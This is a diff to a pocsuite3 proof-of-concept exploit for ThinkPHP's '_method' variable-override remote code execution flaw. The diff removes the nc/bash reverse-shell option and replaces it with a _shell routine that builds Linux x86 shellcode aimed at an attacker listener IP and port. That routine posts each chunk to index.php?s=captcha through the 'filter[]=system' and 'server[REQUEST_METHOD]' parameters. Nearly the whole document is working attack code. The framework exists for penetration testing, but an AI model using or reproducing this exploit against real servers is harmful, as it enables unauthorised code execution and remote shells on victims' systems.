@@ -5,8 +5,10 @@ for more about information, plz visit http://pocsuite.org
 """
 from collections import OrderedDict
 
-from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict
-from pocsuite3.lib.utils import random_str
+from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, \
+    get_listener_ip, get_listener_port
+from pocsuite3.lib.core.enums import OS_ARCH, OS
+from pocsuite3.lib.utils import random_str, generate_shellcode_list
 
 
 class DemoPOC(POCBase):
@@ -25,15 +27,6 @@ class DemoPOC(POCBase):
     desc = '''Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。'''
     samples = []
     category = POC_CATEGORY.EXPLOITS.WEBAPP
-
-    def _options(self):
-        o = OrderedDict()
-        payload = {
-            "nc": REVERSE_PAYLOAD.NC,
-            "bash": REVERSE_PAYLOAD.BASH,
-        }
-        o["command"] = OptDict(selected="bash", default=payload)
-        return o
 
     def _check(self, url):
         flag = 'PHP Extension Build'
@@ -87,18 +80,22 @@ class DemoPOC(POCBase):
         return self.parse_output(result)
 
     def _shell(self):
-        cmd = self.get_option("command")
         vulurl = self.url + "/index.php?s=captcha"
-        data = {
-            '_method': '__construct',
-            'filter[]': 'system',
-            'method': 'get',
-            'server[REQUEST_METHOD]': cmd
-        }
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        requests.post(vulurl, data=data, headers=headers)
+        # 生成写入文件的shellcode
+        _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
+                                        os_target=OS.LINUX,
+                                        os_target_arch=OS_ARCH.X86)
+        for i in _list:
+            data = {
+                '_method': '__construct',
+                'filter[]': 'system',
+                'method': 'get',
+                'server[REQUEST_METHOD]': i
+            }
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+            requests.post(vulurl, data=data, headers=headers)
 
     def parse_output(self, result):
         output = Output(self)
